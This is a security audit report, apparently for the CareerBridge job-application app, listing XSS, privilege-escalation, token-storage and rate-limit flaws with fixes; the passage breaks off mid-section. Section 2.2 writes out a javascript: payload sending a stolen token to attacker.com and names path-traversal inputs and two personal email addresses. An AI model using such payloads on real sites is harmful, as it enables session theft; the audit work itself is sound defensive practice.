# CAREERBRIDGE — MASTER SECURITY AUDIT REPORT & REMEDIATION ROADMAP

**Document Version**: 1.0.0  
**Audit Type**: Comprehensive Read-Only / Non-Destructive Security Architecture Audit  
**Target Repository**: `d:\Projects\CareerBridge`  
**Execution Timestamp**: 2026-11-23T02:30:00Z  
**Compliance Standard**: OWASP Top 10 (Web & API), CIS Benchmarks, NIST SP 800-53, Milestone 1 Verification Specifications (`test/sec-verification.js`)  
**Audit Authority**: Independent Forensic Security Audit Team  

---

## 1. Executive Summary & Security Posture Assessment

### 1.1 Executive Overview
An in-depth, strictly read-only, non-destructive security audit of the **CareerBridge** application was conducted across all codebase components, including the custom Node.js backend (`backend/sync-server.js`), persistence layer (`backend/db.js`), authentication handler (`backend/auth-handler.js`), frontend static glassmorphism interface (`frontend/`), and the Chrome Manifest V3 browser extension (`extension/`).

The audit evaluated the codebase against **19 specific core security checklist categories** and **4 absent or unbuilt security features** (Multi-Factor Authentication, Password Reset Token Entropy/Expiration, Session Revocation, and Account Lockout).

### 1.2 System Architecture Summary
- **Backend Runtime**: Node.js (>=14) native HTTP/HTTPS server (`backend/sync-server.js:788–2427`) operating without an external framework (such as Express, Fastify, or Koa). Routing and route guarding are managed via custom URL parsing and regular expression matching.
- **Persistence Tier**: Dual-mode storage engine (`backend/db.js`):
  1. *Production Cloud Mode*: PostgreSQL connection pooling via `pg.Pool` (`pg` v8.11.3) activated when `DATABASE_URL` is configured.
  2. *Local Development Fallback*: Local JSON flat-file storage (`database/users/{userId}.json`, `database/user-registry.json`, `database/map-reports.json`, `database/telemetry.json`) with serialized Promise queues (`_writeQueues`) to prevent concurrent write corruption.
- **Authentication & Authorization**: Local HMAC-SHA256 JWT generation (`jsonwebtoken` v9.0.3), synchronous password hashing (`bcryptjs` v3.0.3), and optional Supabase OAuth token verification.
- **Frontend Architecture**: Static HTML5/CSS3 glassmorphism web applications (`frontend/`), vanilla modular JavaScript (`frontend/shared-shell.js`, `frontend/admin/admin-shell.js`), served via `http-server` (port 8000) or static hosting (Netlify).
- **Client Extension**: Chrome Manifest V3 browser extension (`extension/`) facilitating candidate autofill, DOM scraping, and local/remote synchronization.

### 1.3 Overall Security Posture & Risk Scorecard
- **Overall Posture Grade**: **C- (Elevated Risk / Action Required Prior to Multi-Tenant Launch)**
- **Audit Findings Summary**:
  - **Total Categories Audited**: 23 (19 Core Checklist Items + 4 Absent / Unbuilt Features)
  - **Implemented (Secure / Safe by Architecture)**: 4 items (SQL Injection, CSRF Protection, Source Maps, Webhook Signatures)
  - **Partially Implemented / Vulnerable**: 14 items (XSS, Password Hashing, Server-Side Permissions, RLS, File Uploads, SSRF Protection, BOLA/IDOR, Rate Limiting, JWT Secrets, API Keys, Default Credentials, CORS Policy, Clean Production Logs, Dependencies)
  - **Vulnerable (Critical Architectural Flaws)**: 1 item (Token Storage)
  - **Not Implemented / Broken Stubs**: 4 items (MFA Protection, Password Reset, Session Revocation, Account Lockout)
- **Automated Milestone 1 Test Suite Verification (`node test/sec-verification.js`)**:
  - Total Tests: 14 | **Passed**: 9 | **Failed**: 5
  - Failing Controls:
    1. `SEC-02`: Committed candidate PII file present in `database/users/u_mybckav7h6.json`.
    2. `SEC-04`: Hardcoded personal developer emails granting automatic admin privilege escalation in `backend/sync-server.js`.
    3. `SEC-07`: Static CORS allowlist includes wildcard extension (`chrome-extension://`) and fails to check `ALLOWED_EXTENSION_IDS`.
    4. `SEC-10`: Client IP resolution blindly trusts `X-Forwarded-For` without checking `TRUST_PROXY`, enabling trivial rate limit bypass.
    5. `SEC-12`: Missing `POST /api/auth/logout` endpoint in `backend/sync-server.js` preventing token invalidation.

### 1.4 Primary Architecture Strengths
1. **Strict SQL Parameterization**: All dynamic database queries in `backend/db.js` use positional parameter placeholders (`$1, $2, ...`), completely neutralizing SQL injection attacks in the PostgreSQL persistence layer.
2. **Zero Server-Side Binary Upload Surface**: The backend exposes zero multipart/binary file upload endpoints. File processing (PDF text extraction, docx parsing, image resizing) is executed entirely within client-side browser memory via WebAssembly/Canvas, storing documents in local IndexedDB.
3. **Safe by Architecture CSRF Profile**: Because session authentication relies exclusively on custom HTTP `Authorization: Bearer <token>` headers rather than ambient browser cookies, cross-site request forgery attacks are inherently prevented.
4. **Isolated User Scoping on Candidate APIs**: Standard user endpoints (`/api/profile`, `/api/tracker`) bind directly to `activeUser.id` resolved from cryptographic JWT claims, preventing horizontal IDOR among candidate users.

### 1.5 Primary Architecture Weaknesses & Critical Risks
1. **Backdoor Privilege Escalation (SEC-04)**: Hardcoded personal developer email addresses (`hidhanush07@gmail.com`, `dhanushsiddilingam@gmail.com`) automatically elevate authenticating users to platform administrator status with paid tier privileges.
2. **Complete Rate Limiter Bypass (SEC-10)**: The `getClientIp` function extracts the first client-supplied `X-Forwarded-For` header value without checking `TRUST_PROXY`, allowing attackers to bypass all global, auth, admin, and ATS rate limits by spoofing IP addresses.
3. **Insecure Token & Credential Storage**: All JWT tokens, user roles, and the plaintext master encryption passcode are stored in browser `localStorage`. Plaintext passcodes and tokens are broadcast across the DOM via `window.dispatchEvent(new CustomEvent('jobxapply:shareAuth'))`.
4. **Synchronous Bcrypt Denial of Service**: Main-thread synchronous hashing (`bcrypt.hashSync`, `bcrypt.compareSync`) blocks Node's single-threaded event loop for 80–120ms per operation, exposing the server to trivial CPU starvation and DoS under modest login concurrency.
5. **Stored & DOM Cross-Site Scripting (XSS)**: Flawed HTML escaping in `admin-shell.js` (`escHtml` fails to escape quotes), unvalidated `javascript:` URI injection in candidate portfolio links, and unescaped role parameters in cover letter generation allow script execution in administrative contexts.
6. **Insecure CORS Origin Reflection**: The server reflects `Access-Control-Allow-Origin: "null"` with `Access-Control-Allow-Credentials: "true"` upon rejecting origins, exposing authenticated data to sandboxed iframe exploits.
7. **High-Severity Supply Chain CVEs**: The backend dependency tree contains `fast-uri` (SSRF via IPv6 normalization, CVSS 7.5), root contains vulnerable `follow-redirects` (credential leak), and all 10 frontend CDN scripts lack Subresource Integrity (SRI) hashes.

### 1.6 Non-Destructive Audit Compliance Statement
In strict accordance with the audit mandate, **no application code, configuration files, environment definitions, or database schemas were altered, deleted, or committed** during this audit. The integrity of the working directory (`d:\Projects\CareerBridge`) has been completely preserved.

---

## 2. Master Security Audit Matrix

| # | Checklist Item / Category | Current Implementation Status | Severity | Primary Code Locations | Summary of Audit Findings |
|---|---|---|---|---|---|
| **1** | **SQL Injection** | **Implemented** | Low (Maintenance) | `backend/db.js:245–804` | 100% parameterized queries (`$1, $2, ...`) across all tables; fallback file storage regex-sanitizes file paths. |
| **2** | **XSS (Cross-Site Scripting)** | **Partially Implemented / Vulnerable** | **High** | `frontend/admin/admin-shell.js:6–10`, `frontend/admin/users.html:545–597`, `frontend/cover-letter.html:1284`, `extension/sidepanel.js:271–311`, `netlify.toml:14` | Defective `escHtml()` fails on quotes in inline handlers; stored XSS via `javascript:` links; DOM XSS in cover letter; CSP allows `'unsafe-inline'`. |
| **3** | **Password Hashing** | **Partially Implemented / Vulnerable** | **High** | `backend/auth-handler.js:25–141`, `frontend/shared-shell.js:355–471`, `backend/sync-server.js:732` | Bcrypt 10 rounds with complexity checks; synchronous calls block event loop (DoS); weak single-round SHA-256 client passcode; plaintext passcode in `localStorage`. |
| **4** | **Server-Side Permissions** | **Partially Implemented / Vulnerable** | **Critical** | `backend/sync-server.js:644–717, 1179–1191, 1334–1344` | Hardcoded developer emails auto-elevate to admin (SEC-04); zero-user takeover risk in `POST /api/profile`; missing `/api/auth/logout`. |
| **5** | **Row Level Security (RLS)** | **Partially Implemented** | **High** | `backend/db.js:20–74`, `frontend/auth.html:301–302` | App-level tenant isolation in `db.js`; PostgreSQL RLS completely absent; public Supabase Anon Key exposes direct PostgREST bypass hazard. |
| **6** | **CSRF Protection** | **Implemented / Safe by Architecture** | Low | `backend/sync-server.js:638–642`, `frontend/shared-shell.js:729` | Authentication via custom `Authorization: Bearer <token>` header; zero cookies used. Ambient browser CSRF attacks impossible. |
| **7** | **File Uploads** | **Partially Implemented / Architecture-Level Isolation** | Medium | `frontend/ats-checker.html:617–645`, `frontend/profile-setup.html:1365–1401`, `backend/sync-server.js:1785–1805` | Zero server-side multipart endpoints; client-side IndexedDB isolation; missing magic-byte inspection; admin file overwrites in `/api/admin/llms-config`. |
| **8** | **SSRF Protection** | **Partially Implemented** | Medium | `backend/sync-server.js:603–634`, `backend/routes-jobs.js:27–66`, `frontend/tracker.html:100–114` | Egress restricted to Supabase verify and Adzuna proxy; missing internal IP blacklisting (169.254.169.254, loopback, RFC1918) and DNS pinning. |
| **9** | **BOLA / IDOR** | **Partially Implemented / Vulnerable in Admin** | **High** | `backend/sync-server.js:1036, 1207, 1826–1854, 1872–1896` | User endpoints strictly scoped to `activeUser.id`; admin impersonation issues unconstrained 1h JWTs; `PUT /api/admin/users/:id/profile` lacks user existence validation. |
| **10** | **Rate Limiting** | **Partially Implemented / Vulnerable** | **Critical** | `backend/sync-server.js:331–366, 525–543, 794, 897, 928` | Sliding-window limiter in memory; completely bypassable via spoofed `X-Forwarded-For` due to missing `TRUST_PROXY` check (SEC-10); memory resets on restart. |
| **11** | **JWT Secrets** | **Partially Implemented / Vulnerable** | **High** | `backend/auth-handler.js:7–16, 256`, `backend/sync-server.js:652–653` | 64-byte random fallback on startup; 64-byte secret in `.env`; missing algorithm pinning (`algorithms: ["HS256"]`) creates algorithm confusion risk; multi-secret collapsing. |
| **12** | **API Keys & Secrets** | **Partially Implemented / Vulnerable** | **High** | `backend/routes-jobs.js:73–74`, `backend/sync-server.js:603–648`, `frontend/auth.html:301–302` | Adzuna and DB keys safely loaded via env; Supabase URL and Anon Key hardcoded in frontend and backend; developer emails hardcoded in source files. |
| **13** | **Token Storage** | **Vulnerable** | **Critical** | `frontend/shared-shell.js:7, 312–318, 471`, `frontend/admin/admin-shell.js:13, 130–134`, `frontend/auth-callback.html:103–109` | Zero `httpOnly` cookies; all JWT tokens, roles, and plaintext master passcodes in `localStorage`; credential broadcasting via `window.dispatchEvent`; client role tampering. |
| **14** | **Default Credentials** | **Partially Implemented / Vulnerable** | **High** | `backend/db.js:76–101`, `frontend/admin/login.html:178`, `database/users/u_mybckav7h6.json` | Seeding gated by `SEED_DEFAULT_USERS`; hardcoded bcrypt hashes committed in `db.js`; default admin email in UI placeholder; committed candidate PII file (SEC-02). |
| **15** | **CORS Policy** | **Partially Implemented / Vulnerable** | **High** | `backend/sync-server.js:498–523, 587–601, 742–750` | Wildcard `chrome-extension://` in static allowlist (SEC-07); rejected origins reflect `Access-Control-Allow-Origin: "null"` with `Allow-Credentials: true`; missing `PUT` in allowed methods. |
| **16** | **Webhook Signatures** | **Not Implemented / Not Applicable** | Informational | `backend/sync-server.js` | Zero inbound webhook endpoints or listeners exist in the application. Documented as Not Implemented / Not Applicable. |
| **17** | **Source Maps** | **Not Applicable / Implemented** | Low | `package.json:12`, `netlify.toml:3` | No source maps generated or leaked; static vanilla JavaScript served unminified and un-obfuscated directly in plaintext. |
| **18** | **Clean Production Logs** | **Partially Implemented / Vulnerable** | Medium | `backend/sync-server.js:368–375, 473–493, 1208, 1254`, `backend/db.js:125, 218–238` | Redaction helpers exist for backups; candidate emails logged in plaintext to `adminActivityLog`; database connection errors log raw error objects (credential leak risk). |
| **19** | **Dependencies & Supply Chain** | **Partially Implemented / Vulnerable** | **High** | `backend/package.json`, `package.json`, `frontend/*.html` | High-severity CVE in `fast-uri` (SSRF via IPv6) and `follow-redirects`; 10 frontend CDN scripts lack SRI hashes; floating CDN version tags (`d3@7`, `topojson@3`). |
| **20** | **Absent: MFA Protection** | **Not Implemented / Not Applicable** | **High** | `backend/auth-handler.js`, `frontend/admin/login.html` | Completely absent. Zero TOTP, SMS, or WebAuthn support. Single-factor password gateway for admin console. |
| **21** | **Absent: Password Reset** | **Not Implemented / Broken Stub** | Medium | `backend/auth-handler.js:220–227`, `frontend/reset-password.html` | Endpoints return static HTTP 400 "deprecated"; frontend UI broken; database columns for reset tokens are dead code; no CSPRNG token logic. |
| **22** | **Absent: Session Revocation** | **Not Implemented / Broken Stub** | **High** | `backend/auth-handler.js:230–244`, `backend/sync-server.js` | In-memory revocation cache exists in auth handler, but `sync-server.js` lacks `POST /api/auth/logout` endpoint (SEC-12); tokens cannot be revoked by users. |
| **23** | **Absent: Account Lockout** | **Partially Implemented / Disconnected** | Medium | `backend/sync-server.js:546–565`, `backend/auth-handler.js:90–175` | Lockout tracking logic (`loginFailures`, `isAccountLocked`) defined in `sync-server.js` but never invoked by `loginUser` or `loginAdmin`; brute-force protection disconnected. |

---

## 3. Detailed Technical Deep-Dive Audit Findings

---

### Item 1: SQL Injection
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Implemented`
  - All database interactions executed through `backend/db.js` against PostgreSQL utilize parameterized queries with positional bind parameters (`$1, $2, ...`). User input is never concatenated or interpolated directly into SQL syntax.
  - In local flat-file storage mode, directory traversal attacks are prevented via strict character filtering on user identifiers.
- **2. Existing Security Strengths (with Citations)**:
  - **PostgreSQL Parameterization**: Across all 22 database operations in `backend/db.js`, parameterized queries are consistently enforced:
    - User registration and lookup: `backend/db.js:245` (`SELECT id FROM users WHERE LOWER(email) = $1`), `line 247` (`INSERT INTO users ... VALUES ($1, $2, $3, $4, $5, $6, $7)`), `line 323` (`WHERE LOWER(email) = $1`), `line 345` (`WHERE id = $1`).
    - Profile and userdata operations: `backend/db.js:596` (`SELECT profile FROM userdata WHERE user_id = $1`), `lines 607–610` (`INSERT INTO userdata (user_id, profile) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET profile = $2`), `lines 630, 643–646`.
    - Administrative mutations: `backend/db.js:737` (`UPDATE users SET tier = $1 WHERE id = $2`), `line 753` (`status = $1`), `line 769` (`role = $1`), `line 580` (`DELETE FROM users WHERE id = $1`).
    - Reports and Telemetry: `backend/db.js:667–670` (`INSERT INTO reports ... VALUES ($1, $2, ...)`), `lines 801–804` (`ON CONFLICT (metric_key) DO UPDATE SET metric_value = telemetry.metric_value + 1`).
  - **Path Traversal Sanitization in Local File DB**:
    - `backend/db.js:195–199`:
      ```javascript
      function getUserFilePath(userId) {
        const safeId = String(userId || "").replace(/[^a-zA-Z0-9_\-]/g, "");
        if (!safeId) throw new Error("Invalid User ID");
        return path.join(USERS_DIR, `${safeId}.json`);
      }
      ```
      Path traversal payloads such as `../../etc/passwd` or `..\..\Windows\win.ini` are stripped down to alphanumeric sequences, preventing file escape from `database/users/`.
- **3. Identified Risks & Misconfigurations**:
  - **Lack of Schema Migrations & Query Builder**: DDL queries in `backend/db.js:20–74` are defined as raw multi-line string constants executed on server startup (`initializeDatabase`). Without a query builder (e.g., Kysely, Knex) or static query linter, future developer modifications could inadvertently introduce unparameterized template literals.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Adopt a typed SQL query builder (e.g. `kysely` or `knex`) to ensure compile-time type safety and eliminate manual string drafting.
  2. Integrate `eslint-plugin-sql` into the CI/CD pipeline to automatically detect and reject unescaped string interpolations in query strings.
  3. Decouple schema initialization from `backend/db.js` into dedicated migration files managed by a formal migration runner.

---

### Item 2: XSS (Cross-Site Scripting)
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - The application implements multiple ad-hoc sanitization routines, but several critical injection vulnerabilities exist in the administrative portal, the cover letter generator, the browser extension, and the deployment Content Security Policy.
- **2. Existing Security Strengths (with Citations)**:
  - Robust HTML entity escaping implemented in `frontend/tracker.html:116–123`:
    ```javascript
    function escHtml(str) {
      return String(str || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }
    ```
    This function correctly encodes all five HTML metacharacters, safely handling both element body and attribute contexts.
  - Safe URL validator in `frontend/tracker.html:100–114` specifically strips and rejects `javascript:` and `data:` schemes, successfully satisfying test `SEC-05`.
  - LaTeX entity escaping in `backend/sync-server.js:2104–2119` (`escapeLatex`) sanitizes `\`, `&`, `%`, `$`, `#`, `_`, `{`, `}`, `~`, and `^` before compiling LaTeX documents.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 2.1: Defective `escHtml()` in Administrative Utilities (CRITICAL)**:
    - *Location*: `frontend/admin/admin-shell.js`, lines 6–10:
      ```javascript
      function escHtml(str) {
        const div = document.createElement("div");
        div.textContent = String(str || "");
        return div.innerHTML;
      }
      ```
    - *Mechanics*: Setting `div.textContent` and reading `div.innerHTML` encodes `<`, `>`, and `&`, but **fails to encode single quotes (`'`) and double quotes (`"`)**.
    - *Exploitation*: This helper is directly interpolated into inline HTML event handler attributes delimited by single quotes across admin pages:
      - `frontend/admin/reports.html:183`: `onclick="resolveReport('${escHtml(r.id)}')"`
      - `frontend/admin/users.html:545`: `onchange="changeTier('${safeId}', this.value)"`
      - `frontend/admin/users.html:552`: `onclick="inspectUserProfile('${safeId}')"`
      - `frontend/admin/users.html:553`: `onclick="impersonateUser('${safeId}')"`
      - `frontend/admin/users.html:555–560`: `onclick="changeRole('${safeId}', 'user')"` / `onclick="suspendUser('${safeId}')"`
      If a user ID or report ID contains a single quote, it breaks out of the attribute and executes arbitrary JavaScript in the administrator's authenticated session.
  - **Vulnerability 2.2: Stored XSS via Unvalidated Portfolio and LinkedIn URLs**:
    - *Location*: `frontend/admin/users.html`, line 597:
      ```javascript
      <div><strong>Portfolio:</strong> ${profile.portfolio || profile.linkedin ? `<a href="${escHtml(profile.portfolio || profile.linkedin)}" target="_blank" ...>${escHtml(profile.portfolio || profile.linkedin)}</a>` : 'None'}</div>
      ```
    - *Mechanics*: `escHtml` does not validate URI protocols. An attacker can set their profile `portfolio` to `javascript:fetch('https://attacker.com/steal?token='+localStorage.getItem('jxa_token'))`. When an admin views the user profile in the admin console and clicks the link, the payload executes.
  - **Vulnerability 2.3: Stored DOM XSS in Cover Letter Generator**:
    - *Location*: `frontend/cover-letter.html`, lines 1281–1285:
      ```javascript
      const displayRole = cl.role || "Preset";
      document.getElementById('summary-select').innerHTML = `
        <option value="">-- Choose pre-defined summaries --</option>
        <option value="custom_role" ${cl.summarySelect === 'custom_role' ? 'selected' : ''}>${displayRole} Summary Preset</option>
      ```
    - *Mechanics*: `displayRole` is concatenated directly into `.innerHTML` without HTML entity encoding.
  - **Vulnerability 2.4: Unsafe Fallback when DOMPurify CDN Fails**:
    - *Location*: `frontend/cover-letter.html`, lines 1272 and 2022:
      ```javascript
      richPreview.innerHTML = (window.DOMPurify ? DOMPurify.sanitize(html) : html);
      ```
    - *Mechanics*: If `DOMPurify` fails to load (due to network failure, CDN outage, or ad blockers), the code falls back to assigning raw, unsanitized `html` directly into `innerHTML`.
  - **Vulnerability 2.5: Browser Extension DOM XSS via `innerHTML`**:
    - *Location*: `extension/sidepanel.js:271–279, 300–311`, `extension/popup.js:268`, and `extension/content.js:853`.
    - *Mechanics*: Candidate application fields (`app.company`, `app.role`, `app.status`) scraped from external job boards are interpolated directly into `.innerHTML` without escaping.
  - **Vulnerability 2.6: Overly Permissive Content Security Policy (CSP)**:
    - *Location*: `netlify.toml`, line 14:
      ```toml
      Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; ..."
      ```
    - *Mechanics*: Permitting `'unsafe-inline'` in `script-src` strips the browser of its ability to block injected inline scripts, rendering DOM XSS fully exploitable.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Standardize `escHtml` across all frontend scripts using the 5-entity replacement:
     ```javascript
     function escHtml(str) {
       return String(str || '')
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
         .replace(/>/g, '&gt;')
         .replace(/"/g, '&quot;')
         .replace(/'/g, '&#39;');
     }
     ```
  2. Eliminate inline event handlers (`onclick="..."`) in `reports.html` and `users.html`. Use `data-id` attributes and event listeners:
     ```javascript
     button.dataset.id = r.id;
     button.addEventListener('click', (e) => resolveReport(e.currentTarget.dataset.id));
     ```
  3. Validate URI schemes before rendering hyperlinks in `users.html:597`:
     ```javascript
     function safeHref(url) {
       if (!url) return '';
       try {
         const u = new URL(url.trim());
         return (u.protocol === 'http:' || u.protocol === 'https:') ? escHtml(url.trim()) : '';
       } catch { return ''; }
     }
     ```
  4. Bundle `DOMPurify` locally rather than relying on CDN, and remove the unsafe fallback:
     ```javascript
     richPreview.innerHTML = DOMPurify.sanitize(html); // Never fallback to raw html
     ```
  5. Refactor extension scripts to use `textContent` or `document.createElement()` instead of `.innerHTML`.
  6. Harden CSP in `netlify.toml` by removing `'unsafe-inline'` and implementing nonces or hashes.

---

### Item 3: Password Hashing
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - Server-side user password hashing implements strong password complexity and `bcryptjs` with 10 salt rounds. However, hashing is executed synchronously on the Node.js main thread, creating a Denial of Service hazard.
  - Client-side master passcode derivation relies on a weak single iteration of SHA-256 with a static salt, stores the passcode in plaintext in `localStorage`, and the server accepts the passcode hash as an unexpiring API token.
- **2. Existing Security Strengths (with Citations)**:
  - **Strict Password Complexity Enforcement**: `backend/auth-handler.js:25–33`:
    ```javascript
    function validatePassword(password) {
      if (typeof password !== "string") return false;
      if (password.length < 8 || password.length > 128) return false;
      const hasUpper = /[A-Z]/.test(password);
      const hasDigit = /[0-9]/.test(password);
      const hasSpecial = /[^A-Za-z0-9]/.test(password);
      return hasUpper && hasDigit && hasSpecial;
    }
    ```
    Guarantees entropy and prevents trivially weak passwords.
  - **Bcrypt Work Factor**: `backend/auth-handler.js:66` uses 10 salt rounds (`bcrypt.hashSync(password, 10)`), which represents an industry-standard computational cost for offline cracking defense.
  - **Hash Stripping on Transmission & Backups**:
    - `backend/auth-handler.js:75–80, 113–118, 164–169`: API responses strip `passwordHash`, returning only `{ id, email, name, role }`.
    - `backend/db.js:218–238` (`sanitizeForBackup`): Sanitizes all user records prior to JSON database backup, stripping `passwordHash`, `password_hash`, `passcodeHash`, and `resetTokenHash`. Satisfies test `SEC-08`.
    - `backend/sync-server.js:478–486`: `redactSensitiveUserData` strips password and passcode hashes.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 3.1: Synchronous Bcrypt Execution Starves Node Event Loop (DoS Risk)**:
    - *Location*: `backend/auth-handler.js`, lines 66, 102, 141:
      ```javascript
      const passwordHash = bcrypt.hashSync(password, 10); // line 66
      const isValid = bcrypt.compareSync(password, user.passwordHash); // line 102
      const isValid = bcrypt.compareSync(password, admin.passwordHash); // line 141
      ```
    - *Mechanics*: Node.js is single-threaded. Each `bcrypt.hashSync` or `compareSync` at 10 rounds takes 80–120ms of synchronous CPU time. During concurrent login attempts or credential-stuffing attacks, the main thread is blocked, freezing all incoming HTTP requests and SSE streams for all users.
  - **Vulnerability 3.2: Weak Single-Round Client Passcode Hashing with Static Salt**:
    - *Location*: `frontend/shared-shell.js:355–361` and `extension/shared.js:14`:
      ```javascript
      const data = encoder.encode(passcode + ":jobxapply_salt_v2");
      const hashBuffer = await crypto.subtle.digest("SHA-256", data);
      return uint8ToBase64(new Uint8Array(hashBuffer));
      ```
    - *Mechanics*: A single iteration of SHA-256 provides zero work factor against GPU or ASIC brute-force attacks. The salt `:jobxapply_salt_v2` is static and publicly committed in source code.
  - **Vulnerability 3.3: Plaintext Passcode Persisted in Client Storage**:
    - *Location*: `frontend/shared-shell.js`, lines 471 and 1629:
      ```javascript
      localStorage.setItem('jxa_passcode', passcode);
      ```
      And `extension/background.js:196`: `chrome.storage.local.set({ jxa_passcode: passcode })`.
    - *Mechanics*: Persisting the user's master encryption passcode in unencrypted web storage completely invalidates "zero-knowledge" privacy claims. Any XSS or extension vulnerability can immediately read the plaintext passcode.
  - **Vulnerability 3.4: Passcode Hash Accepted as Permanent API Bearer Token**:
    - *Location*: `backend/sync-server.js`, line 732:
      ```javascript
      return await db.getUserByPasscodeHash(token);
      ```
    - *Mechanics*: If a client supplies `Authorization: Bearer <passcode_hash>`, the server resolves the user without expiration or signature verification. The static SHA-256 hash becomes an unexpiring master token.
  - **Vulnerability 3.5: Plaintext Password Stored in Extension Profile for Autofill**:
    - *Location*: `extension/content.js:35, 618–624, 703–704` and `extension/shared.js:5`.
    - *Mechanics*: The candidate profile schema stores `portalPassword` in plaintext, which is autofilled into any form input with a `password` label.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Convert all `bcryptjs` synchronous calls to asynchronous native `bcrypt` (or `argon2id`):
     ```javascript
     const passwordHash = await bcrypt.hash(password, 12);
     const isValid = await bcrypt.compare(password, user.passwordHash);
     ```
  2. Upgrade client-side passcode derivation to PBKDF2-HMAC-SHA256 (minimum 100,000 iterations) with a unique per-user salt retrieved from the server.
  3. Purge `localStorage.setItem('jxa_passcode', ...)` and `chrome.storage.local`. Keep the master passcode strictly in ephemeral JavaScript memory during the active session.
  4. Discontinue accepting `passcode_hash` as an API bearer token in `backend/sync-server.js:732`. Require genuine JWT session tokens for all API requests.

---

### Item 4: Server-Side Permissions & RBAC
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - Role-based access control (RBAC) is implemented via route prefix interception. Candidate user endpoints are securely scoped to the token's authenticated user ID.
  - However, critical privilege escalation vulnerabilities exist: hardcoded developer email addresses automatically elevate accounts to admin status, and zero-user initialization allows unauthenticated takeover.
- **2. Existing Security Strengths (with Citations)**:
  - **Centralized Administrative Route Guard**:
    - `backend/sync-server.js:1334–1344`:
      ```javascript
      if (urlObj.pathname.startsWith("/api/admin/") || urlObj.pathname.startsWith("/api/reports") || (req.method === "POST" && urlObj.pathname === "/api/maps")) {
        if (!activeUser || activeUser.role !== "admin") {
          sendJson(res, 403, { ok: false, error: "Forbidden: Admin privileges required" });
          return;
        }
      }
      ```
      Guarantees that all administrative endpoints, portal report endpoints, and selector mapping updates require `role === "admin"`.
  - **Dedicated Admin Authentication Endpoint**:
    - `backend/sync-server.js:927–941` and `backend/auth-handler.js:127–175`: Authenticates administrative users specifically, enforcing `if (user.role !== "admin") return 403`, and issuing shorter-lived 12-hour session tokens (`expiresIn: "12h"`).
  - **User Isolation on Core APIs**: Standard user endpoints (`GET/POST /api/profile`, `GET/POST /api/tracker`, `DELETE /api/profile`) bind strictly to `activeUser.id` resolved from the cryptographically verified JWT, preventing horizontal privilege escalation.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 4.1: Hardcoded Personal Developer Emails Auto-Elevate to Admin (CRITICAL, SEC-04 Failure)**:
    - *Location*: `backend/sync-server.js`, lines 644–648, 664–665, 676–683, 698–700, 714–717:
      ```javascript
      const ADMIN_EMAILS = new Set([
        "hidhanush07@gmail.com",
        "dhanushsiddilingam@gmail.com",
        "admin@jobxapply.app"
      ]);
      ```
    - *Mechanics*: During token verification in `getRequestUser()`, the server checks whether the authenticated user's email matches the hardcoded `ADMIN_EMAILS` set. If matched, the server automatically updates the user's role to `"admin"` and tier to `"paid"` in the database (`await db.updateUserRole(user.id, "admin")`).
    - *Impact*: Any account created or authenticated via OAuth matching either of these personal Gmail addresses is immediately granted full platform administrator rights. This bypasses environment configuration and directly fails test `SEC-04` in `test/sec-verification.js:84–91`.
  - **Vulnerability 4.2: Zero-User Server Initialization Takeover**:
    - *Location*: `backend/sync-server.js`, lines 1179–1191:
      ```javascript
      const currentUsers = await db.getUsersList();
      if (currentUsers.length === 0) {
        if (!incoming.passcodeHash) {
          return sendJson(res, 400, { ok: false, error: "Passcode hash is required to initialize the server" });
        }
        const defaultUser = await db.createUser({
          email: "default@jobxapply.local",
          name: "Default Profile",
          passwordHash: ""
        });
        await db.updateUserPasscodeHash(defaultUser.id, incoming.passcodeHash);
        activeUser = defaultUser;
      }
      ```
    - *Mechanics*: If the database is empty or re-initialized, any unauthenticated attacker sending a `POST /api/profile` with an arbitrary `passcodeHash` creates and binds to `defaultUser`, hijacking the initial profile.
  - **Vulnerability 4.3: Unrestricted Role Assignment in Admin Endpoint**:
    - *Location*: `backend/sync-server.js`, line 1411:
      ```javascript
      const role = incoming.role || "user";
      await db.updateUserRole(targetUserId, role);
      ```
    - *Mechanics*: `incoming.role` is not validated against an allowed enum (`["user", "admin"]`), allowing arbitrary strings to be stored as roles.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Purge all hardcoded developer email addresses (`hidhanush07@gmail.com`, `dhanushsiddilingam@gmail.com`) from `backend/sync-server.js:645–646` and `frontend/admin/admin-shell.js:105, 119`. Parse admin emails exclusively from `process.env.ADMIN_EMAILS`:
     ```javascript
     const ADMIN_EMAILS = new Set((process.env.ADMIN_EMAILS || "")
       .split(",")
       .map(e => e.trim().toLowerCase())
       .filter(Boolean));
     ```
  2. Protect server initialization in `POST /api/profile` by requiring a secure bootstrap token configured in environment variables (`process.env.INITIAL_SETUP_TOKEN`).
  3. Validate roles strictly in `sync-server.js:1411`:
     ```javascript
     if (!["user", "admin"].includes(incoming.role)) {
       return sendJson(res, 400, { ok: false, error: "Invalid role specified" });
     }
     ```

---

### Item 5: Row Level Security (RLS)
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented`
  - Multi-tenant data isolation is implemented strictly at the application layer via SQL `WHERE user_id = $1` filters in `backend/db.js`.
  - Database-level PostgreSQL Row Level Security (RLS) is **completely absent**. Because the Supabase URL and public anonymous key are published in client-side HTML, direct PostgREST querying bypasses application controls if database tables are exposed.
- **2. Existing Security Strengths (with Citations)**:
  - **Application-Level Isolation**:
